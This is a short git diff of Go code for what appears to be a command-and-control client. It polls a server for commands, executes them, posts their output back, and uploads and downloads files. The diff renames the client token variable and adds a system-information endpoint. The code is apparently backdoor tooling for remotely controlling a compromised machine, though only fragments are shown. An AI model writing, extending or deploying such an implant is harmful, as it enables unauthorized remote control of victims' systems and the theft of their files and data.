@@ -27,6 +27,7 @@ const getCmdURL = "/getcmd"
 const cmdOutputURL = "/cmdoutput"
 const uploadFileURL = "/upload"
 const downloadFileURL = "/download"
+const sysInfoURL = "/sysinfo"
 
 // special errors
 var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")
@@ -36,8 +37,7 @@ var hasTLS = true
 
 const hasLogs = true
 
-// client-token
-var token string
+var ClientToken string
 
 func ClientSetup() *http.Client {
 	// set up own cert pool
@@ -80,7 +80,7 @@ func RequestCommand(client *http.Client, host string, port int) (string, string)
 		log.Printf("[-] Error creating the GET request: %s\n", err)
 	}
 
-	req.Header.Add("Token", token)
+	req.Header.Add("Token", ClientToken)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -139,7 +139,7 @@ func Middleware(client *http.Client, cmd string, host string) {
 			return
 		}
 
-		req.Header.Add("Token", token)
+		req.Header.Add("Token", ClientToken)
 		req.Header.Set("Content-Type", "text/html")
 
 		client.Do(req)
@@ -236,7 +236,7 @@ func ExecAndGetOutput(cmdString string) []byte {
 
 func RunClient(host string, port int) {
 	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
-	token = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)
+	ClientToken = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)
 
 	if !hasLogs {
 		log.SetFlags(0)
